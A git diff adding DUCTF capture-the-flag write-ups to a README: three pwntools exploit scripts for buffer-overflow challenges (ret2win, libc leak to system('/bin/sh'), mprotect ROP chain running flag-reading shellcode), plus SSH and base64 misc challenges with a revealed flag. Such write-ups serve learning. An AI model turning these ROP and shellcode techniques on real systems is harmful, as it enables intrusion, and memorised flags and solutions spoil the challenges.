@@ -2,6 +2,161 @@
 
 Some writeups about challenges that i have done.
 
+## Pwn
+
+### Shell this!
+
+> Somebody told me that this program is vulnerable to something called remote code execution?
+I'm not entirely sure what that is, but could you please figure it out for me?
+nc chal.duc.tf 30002
+
+```
+from pwn import *
+
+sh = remote('chal.duc.tf', 30002)
+
+sh.recvuntil('name: ')
+
+payload = b'A'*56
+payload += p64(0x00000000004006ca)
+
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+[shellthis](./resources/pwn/shell_this/shellthis)
+[shellthis.c](./resources/pwn/shell_this/shellthis.c)
+
+### Return to what
+
+> This will show my friends!
+nc chal.duc.tf 30003
+
+```
+from pwn import *
+
+context.log_level = 'DEBUG'
+
+elf = ELF('./return-to-what.bin')
+libc = ELF('/home/ubuntu/Downloads/R2W/libc6_2.27-3ubuntu1_amd64.so', checksec=False)
+
+#sh = process(elf.path)
+sh = remote('chal.duc.tf', 30003)
+
+sh.recvuntil('return to?\n')
+
+payload = b'A'*56
+payload += p64(0x000000000040122b) # pop rdi ; ret
+payload += p64(elf.got['puts'])
+payload += p64(elf.sym['puts'])
+payload += p64(elf.sym['vuln'])
+
+sh.sendline(payload)
+
+puts_leak = u64(sh.recvuntil('\n', drop=True).ljust(8, b'\x00'))
+log.success(f'Leaked puts address: {hex(puts_leak)}')
+
+libc.address = puts_leak - libc.sym['puts']
+log.success(f'Base libc address: {hex(libc.address)}')
+
+sh.recvuntil('return to?\n')
+
+payload = b'A'*56
+payload += p64(0x000000000040122b) # pop rdi ; ret
+payload += p64(libc.search(b'/bin/sh\x00').__next__())
+payload += p64(0x0000000000401016)
+payload += p64(libc.sym['system'])
+
+
+sh.sendline(payload)
+```
+
+[return-to-what](./resources/pwn/return_to_what/return-to-what)
+
+### Return to what's revenge
+
+> My friends kept making fun of me, so I hardened my program even further!
+The flag is located at /chal/flag.txt.
+nc chal.duc.tf 30006
+
+```
+from pwn import *
+from time import sleep
+
+context(arch='amd64', os='linux')
+context.log_level = 'DEBUG'
+context.terminal = ['tmux', 'sp', '-h']
+
+elf = ELF('/home/ubuntu/Downloads/R2WR/return-to-whats-revenge.bin')
+libc = ELF('/home/ubuntu/Downloads/R2W/libc6_2.27-3ubuntu1_amd64.so', checksec=False)
+#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
+
+#sh = process(elf.path)
+sh = remote('chal.duc.tf', 30006)
+
+sh.recvuntil('return to?\n')
+
+payload = b'A'*56
+payload += p64(0x00000000004019db) # pop rdi ; ret
+payload += p64(elf.got['puts'])
+payload += p64(elf.sym['puts'])
+payload += p64(elf.sym['vuln'])
+
+sh.sendline(payload)
+
+puts_leak = u64(sh.recvuntil('\n', drop=True).ljust(8, b'\x00'))
+log.success(f'Leaked puts address: {hex(puts_leak)}')
+
+libc.address = puts_leak - libc.sym['puts']
+log.success(f'Base libc address: {hex(libc.address)}')
+
+"""
+gdb.attach(sh, '''
+    b *0x4011D9
+    c
+''')
+"""
+
+sh.recvuntil('return to?\n')
+
+shellcode = ''
+shellcode += shellcraft.open('/chal/flag.txt')
+shellcode += shellcraft.read('rax', 0x404050, 0x30)
+shellcode += shellcraft.write(1, 0x404050, 0x30)
+
+payload = b'A'*56
+payload += p64(0x00000000004019db) # pop rdi ; ret
+payload += p64(0x0)
+payload += p64(0x00000000004019d9) # pop rsi ; pop r15 ; ret
+payload += p64(0x404080)
+payload += p64(0x0)
+payload += p64(libc.address + 0x000000000011c65c) # pop rdx ; pop r12 ; ret
+payload += p64(len(asm(shellcode)))
+payload += p64(0x0)
+payload += p64(libc.sym['read'])
+payload += p64(0x00000000004019db) # pop rdi ; ret
+payload += p64(0x404000)
+payload += p64(0x00000000004019d9) # pop rsi ; pop r15 ; ret
+payload += p64(0x1000)
+payload += p64(0x0)
+payload += p64(libc.address + 0x000000000011c65c) # pop rdx ; pop r12 ; ret
+payload += p64(0x7)
+payload += p64(0x0)
+payload += p64(libc.sym['mprotect'])
+payload += p64(0x404080)
+
+sh.sendline(payload)
+
+sleep(2)
+
+sh.send(asm(shellcode))
+
+sh.interactive()
+```
+
+[return-to-whats-revenge](./resources/pwn/return_to_whats_revenge/return-to-whats-revenge)
+
 ## Forensics
 
 ### On the spectrum
@@ -108,6 +263,28 @@ print(output)
 [challenge.txt](./resources/crypto/rot-i/challenge.txt)
 
 ## Misc
+
+### Welcome
+
+> Welcome to DUCTF!
+ssh ductf@chal.duc.tf -p 30301
+Password: ductf
+
+Here we are given a ssh server and creds. If we use them we get a weird colored text and if we watch it carefully the flag is visible there.
+
+![](./resources/misc/welcome/1.png)
+
+### 16 Home Runs
+
+> How does this string relate to baseball in anyway? What even is baseball? And how does this relate to Cyber Security? ¯(ツ)/¯
+RFVDVEZ7MTZfaDBtM19ydW41X20zNG41X3J1bm4xbjZfcDQ1N182NF9iNDUzNX0=
+
+This is an easy base64 decode.
+
+```
+$ echo -n "RFVDVEZ7MTZfaDBtM19ydW41X20zNG41X3J1bm4xbjZfcDQ1N182NF9iNDUzNX0=" | base64 -d
+DUCTF{16_h0m3_run5_m34n5_runn1n6_p457_64_b4535}
+```
 
 ### In a pickle
 
